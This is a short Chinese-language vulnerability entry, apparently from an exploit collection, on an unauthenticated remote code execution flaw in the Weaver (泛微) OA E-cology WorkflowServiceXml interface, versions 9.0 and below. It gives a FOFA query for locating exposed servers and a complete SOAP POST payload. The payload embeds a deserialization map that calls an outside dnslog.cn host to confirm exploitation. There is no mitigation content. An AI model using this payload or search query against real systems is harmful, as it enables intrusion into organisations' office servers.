# 泛微OA E-cology WorkflowServiceXml 远程代码执行漏洞

泛微OA E-Cology以移动互联下的组织社交化转型需求为导向，采用轻前端重后端的设计思路，在前端面向用户提供个性化的办公平台，后端引擎帮助企业高效整合既有的IT资源生成符合用户需求的IT应用，帮助企业实现多种路径实现移动协同办公。WorkflowServiceXml接口可被未授权访问，攻击者调用该接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行。

影响版本：
E-cology <= 9.0

FOFA：`app="泛微-协同办公OA"`

详情可以参考：https://www.anquanke.com/post/id/239865

Payload：

//<map>内容实体编码。

```
POST /services%20/WorkflowServiceXml HTTP/1.1
Host: 

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
       <soapenv:Header/>
       <soapenv:Body>
          <web:doCreateWorkflowRequest>    <web:string>
<map>
  <entry>
    <url>http://nv0of7.dnslog.cn</url>
    <string>http://nv0of7.dnslog.cn</string>
  </entry>
</map>
      </web:string>
            <web:string>2</web:string>
          </web:doCreateWorkflowRequest>
       </soapenv:Body>
    </soapenv:Envelope>
```

ref：

* https://nox.qianxin.com/vulnerability/detail/98398
* https://www.anquanke.com/post/id/239865
